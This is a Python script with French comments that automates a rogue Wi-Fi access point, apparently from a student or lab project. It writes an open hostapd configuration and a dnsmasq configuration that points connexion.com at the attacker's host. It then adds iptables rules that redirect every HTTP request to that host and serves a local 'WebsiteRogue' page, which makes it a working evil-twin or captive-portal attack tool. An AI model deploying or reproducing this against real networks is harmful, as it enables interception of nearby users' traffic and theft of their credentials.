import os
import subprocess
import time


# Création du fichier de configuration Hostapd
def create_hostapd_conf(interface, channel, essid):
    config_content = f"""interface={interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
auth_algs=1
"""
    with open("RogueAP/hostapd.conf", "w") as config_file:
        config_file.write(config_content)
    print("[SUCCESS] : Fichier de configuration Hostapd créé avec succès.")
        

# Création du fichier de configuration Dnsmasq
def create_dnsmasq_conf(interface):
    config_content = f"""interface={interface}
dhcp-range=192.168.1.20,192.168.1.80,12h
dhcp-option=3,8.8.8.8
dhcp-option=6,192.168.1.1
address=/connexion.com/192.168.1.1
"""
    with open("RogueAP/dnsmasq.conf", "w") as config_file:
        config_file.write(config_content)
    print("[SUCCESS] : Fichier de configuration Dnsmasq créé avec succès.")


# Configuration des règles iptables
def iptables_conf(interface):
    # Exécution des commandes iptables
    command1 = "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"
    if os.system(command1) != 0:
        print(f"[ERROR] : Échec de l'exécution de la commande : {command1}")
    else:
        print(f"[SUCCESS] : Commande exécutée avec succès : {command1}")

    command2 = f"sudo iptables -A FORWARD -i {interface} -j ACCEPT"
    if os.system(command2) != 0:
        print(f"[ERROR] : Échec de l'exécution de la commande : {command2}")
    else:
        print(f"[SUCCESS] : Commande exécutée avec succès : {command2}")

    command3 = "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1"
    if os.system(command3) != 0:
        print(f"[ERROR] : Échec de l'exécution de la commande : {command3}")
    else:
        print(f"[SUCCESS] : Commande exécutée avec succès : {command3}")


# Allumer l'interface réseau si elle est désactivée
def launch_interface(interface):
    if os.system(f"sudo ifconfig {interface} up") != 0:
        print("[ERROR] : Échec de l'activation de l'interface réseau. (Peut-être déjà activée)")
        return
    else:
        print("[SUCCESS] : Interface réseau activée.")


# Démarrer le service Hostapd
def start_hostapd():
    subprocess.Popen(["sudo", "hostapd", "RogueAP/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[SUCCESS] : Service Hostapd démarré avec succès.")
        

# Démarrer le service Dnsmasq
def start_dnsmasq():
    if os.system("sudo systemctl start dnsmasq") != 0:
        print("[ERROR] : Échec du démarrage du service Dnsmasq.")
    else:
        print("[SUCCESS] : Service Dnsmasq démarré avec succès.")


# Lancer le serveur HTTP Python
def start_http_server():
    os.chdir("src/rogue_ap/WebsiteRogue")
    http_server_process = subprocess.Popen(["sudo", "python3", "-m", "http.server", "80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[SUCCESS] : Serveur HTTP démarré avec succès.")
    return http_server_process


# Configuration du Rogue AP        
def setup_rogue_ap(interface, channel, essid):
    create_hostapd_conf(interface, channel, essid)
    create_dnsmasq_conf(interface)
    iptables_conf(interface)
    launch_interface(interface)
    start_dnsmasq()
    start_hostapd()
    

# Test de la fonction setup_rogue_ap
if __name__ == "__main__":
    setup_rogue_ap("wlan0", 6, "TestWifiProject")